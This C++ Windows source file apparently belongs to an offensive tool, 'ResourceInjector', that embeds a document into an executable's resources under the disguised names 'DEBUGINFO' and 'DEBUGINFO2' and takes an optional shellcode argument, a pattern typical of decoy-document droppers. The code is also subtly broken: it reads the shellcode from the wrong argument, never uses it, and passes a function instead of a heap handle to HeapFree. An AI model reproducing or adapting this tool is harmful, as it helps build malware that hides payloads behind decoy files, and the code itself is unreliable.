#include <Windows.h>
#include <iostream>

void printLastError() {
    char lpMsgBuf[2000];
    DWORD dw = GetLastError();

    FormatMessageA(
        FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)lpMsgBuf,
        2000,
        NULL);

    printf("%s\n", lpMsgBuf);
    exit(1);
}

int main(int argc, LPSTR argv[])
{
    if (argc < 3) {
        printf("Usage: ResourceInjector <PEFile> <document-file> [<shellcode>]\n");
        exit(1);
    }
    char peFileName[1000];
    strcpy_s(peFileName, 1000, argv[1]);
    printf("PE File name: %s\n", peFileName);
    char docName[1000]; 
    memset(docName, 0, 1000);
    strcpy_s(docName, 1000, argv[2]);
    printf("Document: %s\n", docName);

    HANDLE docHandle = CreateFileA(
        docName,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (docHandle == INVALID_HANDLE_VALUE) {
        printf("CreateFile(%s): ", docName);
        printLastError();
    }
    DWORD size = GetFileSize(docHandle, NULL);
    LPVOID docContent = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    DWORD numberOfBytesRead = 0;
    ReadFile(docHandle, docContent, size, &numberOfBytesRead, NULL);
    if (numberOfBytesRead < size) printLastError();
    CloseHandle(docHandle);

    LPSTR shellcodeRes = NULL;
    if (argc >= 4) shellcodeRes = _strdup(argv[4]);

    HANDLE updHandle = BeginUpdateResourceA((LPCSTR)peFileName, false);
    if (updHandle == NULL) {
        printf("BeginUpdateResourceA: ");
        printLastError();
    }
    

    if (!UpdateResourceA(updHandle, MAKEINTRESOURCEA(300), "DEBUGINFO", LANG_USER_DEFAULT, docContent, size)) printLastError();

    strcat_s(docName, 1000, ".dump\0");

    if (!UpdateResourceA(updHandle, MAKEINTRESOURCEA(6), "DEBUGINFO2", LANG_USER_DEFAULT, docName, strlen(docName))) printLastError();

    EndUpdateResource(updHandle, false);

    
    HeapFree(GetProcessHeap, HEAP_NO_SERIALIZE, docContent);
}

